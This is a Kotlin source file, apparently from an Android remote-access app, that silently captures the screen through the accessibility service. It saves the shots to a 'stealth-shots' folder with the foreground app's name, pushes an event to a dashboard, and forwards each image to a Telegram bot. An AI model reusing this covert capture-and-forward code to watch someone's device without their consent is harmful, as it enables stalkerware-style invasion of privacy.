package com.ismartcoding.plain.helpers

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.view.Display
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.events.EventType
import com.ismartcoding.plain.events.WebSocketEvent
import com.ismartcoding.lib.channel.sendEvent
import com.ismartcoding.lib.helpers.JsonHelper
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.services.PlainAccessibilityService
import com.ismartcoding.plain.telegram.TelegramBotManager
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.serialization.Serializable
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import kotlin.coroutines.resume

/**
 * Wraps AccessibilityService.takeScreenshot (API 30+) into a coroutine and
 * persists the resulting bitmap as a JPEG inside the private stealth-shots
 * directory. Also broadcasts a WebSocket event so any open dashboard refreshes.
 *
 * Returns null on Android 10 and older, or when the accessibility service is
 * not connected, or when the framework returns an error result.
 */
object StealthScreenshotCapturer {
    private val executor = Executors.newSingleThreadExecutor()
    private val fileNameFormat = SimpleDateFormat("yyyyMMdd_HHmmss_SSS", Locale.US)

    @Serializable
    data class CaptureBroadcast(
        val id: String,
        val ts: Long,
        val packageName: String,
        val appLabel: String,
        val width: Int,
        val height: Int,
        val sizeBytes: Long,
        val manual: Boolean,
        val totalShots: Int,
    )

    suspend fun captureNow(manual: Boolean): StealthScreenshotHelper.Shot? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            LogCat.d("StealthScreenshot: skipping, requires API 30+ (current: ${Build.VERSION.SDK_INT})")
            return null
        }
        val svc = PlainAccessibilityService.instance ?: run {
            LogCat.d("StealthScreenshot: accessibility service is not connected")
            return null
        }
        val bitmap = takeScreenshotInternal(svc) ?: return null
        return persist(bitmap, manual)
    }

    @Suppress("DEPRECATION")
    private suspend fun takeScreenshotInternal(svc: AccessibilityService): Bitmap? {
        return suspendCancellableCoroutine { cont ->
            try {
                svc.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    executor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hardwareBuffer: HardwareBuffer = result.hardwareBuffer
                                val bmp = Bitmap.wrapHardwareBuffer(hardwareBuffer, result.colorSpace)
                                hardwareBuffer.close()
                                if (bmp != null) {
                                    val sw = bmp.copy(Bitmap.Config.ARGB_8888, false)
                                    bmp.recycle()
                                    cont.resume(sw)
                                } else cont.resume(null)
                            } catch (e: Throwable) {
                                LogCat.e("StealthScreenshot wrap failed: ${e.message}")
                                cont.resume(null)
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            LogCat.d("StealthScreenshot framework failure code=$errorCode")
                            cont.resume(null)
                        }
                    },
                )
            } catch (e: Throwable) {
                LogCat.e("StealthScreenshot.takeScreenshot threw: ${e.message}")
                cont.resume(null)
            }
        }
    }

    private fun persist(bitmap: Bitmap, manual: Boolean): StealthScreenshotHelper.Shot? {
        return try {
            val ctx = MainApp.instance
            val dir = StealthScreenshotHelper.shotsDir(ctx)
            val ts = System.currentTimeMillis()
            val fname = "shot_${fileNameFormat.format(Date(ts))}.jpg"
            val outFile = File(dir, fname)
            FileOutputStream(outFile).use { fos ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 78, fos)
            }
            val w = bitmap.width
            val h = bitmap.height
            bitmap.recycle()
            val pkg = currentForegroundPackage()
            val label = try { if (pkg.isNotEmpty()) PackageHelper.getLabel(pkg).ifEmpty { pkg } else "" } catch (_: Throwable) { pkg }
            val shot = StealthScreenshotHelper.appendShot(
                packageName = pkg,
                appLabel = label,
                width = w,
                height = h,
                sizeBytes = outFile.length(),
                absPath = outFile.absolutePath,
                manual = manual,
            )
            broadcast(shot)
            if (shot != null) TelegramBotManager.forwardStealthShot(shot)
            shot
        } catch (e: Throwable) {
            LogCat.e("StealthScreenshot.persist failed: ${e.message}")
            null
        }
    }

    private fun currentForegroundPackage(): String {
        return try {
            PlainAccessibilityService.currentForegroundPackage ?: ""
        } catch (_: Throwable) {
            ""
        }
    }

    private fun broadcast(s: StealthScreenshotHelper.Shot) {
        try {
            val payload = CaptureBroadcast(
                id = s.id, ts = s.ts, packageName = s.packageName, appLabel = s.appLabel,
                width = s.width, height = s.height, sizeBytes = s.sizeBytes, manual = s.manual,
                totalShots = StealthScreenshotHelper.count(),
            )
            sendEvent(WebSocketEvent(EventType.SCREENSHOT_CAPTURED, JsonHelper.jsonEncode(payload)))
        } catch (_: Throwable) {}
    }
}
